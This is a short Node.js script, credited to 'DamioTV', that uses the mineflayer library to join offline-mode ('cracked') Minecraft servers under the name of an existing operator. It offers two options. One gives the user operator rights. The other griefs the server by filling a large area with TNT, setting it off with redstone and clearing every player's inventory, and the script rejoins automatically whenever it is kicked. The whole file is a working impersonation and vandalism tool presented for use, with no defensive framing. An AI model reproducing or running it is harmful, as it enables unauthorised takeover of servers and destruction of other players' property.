const mineflayer = require('mineflayer')
const prompt = require("prompt-sync")();




Main()
async function Main(){

const dick = prompt("Made by DamioTV <3")

const ip = prompt("cracked server ip: ");

const opname = prompt("OP nickname: ")
  
const select = prompt("[1]> SELF OP [2]> GRIEF: ")
  
  let yourname = ''


if(select === "1"){
  yourname = prompt("your nickname: ")
}


Login(ip, opname, select, yourname)





}


async function Login(ip, opname, select, yourname){
  const bot = mineflayer.createBot({
    host: ip,
    username: opname,
  });
  
  bot.once('spawn', m=>{
  
    if(select === "1"){
      bot.chat("/op " + yourname)
      console.log(yourname + 'is a new server operator!')
    } 
    if(select === "2"){
  
      bot.chat("/fill ~ ~ ~ ~60 ~20 ~30 minecraft:tnt")
      bot.chat('/fill ~ ~ ~ ~3 ~3 ~3 minecraft:redstone_block')
      bot.chat('/clear @a') 
      bot.chat('DamioTV <3 <3 <3')
      bot.chat('DamioTV <3 <3 <3')
      bot.chat('DamioTV <3 <3 <3')
      console.log('Griefed!')
    }
  
  })
  
  bot.once('kicked', reason =>{
    console.log('kicked,' + reason + '\nrejoining')
    Login(ip, opname, select, yourname)
  })
}
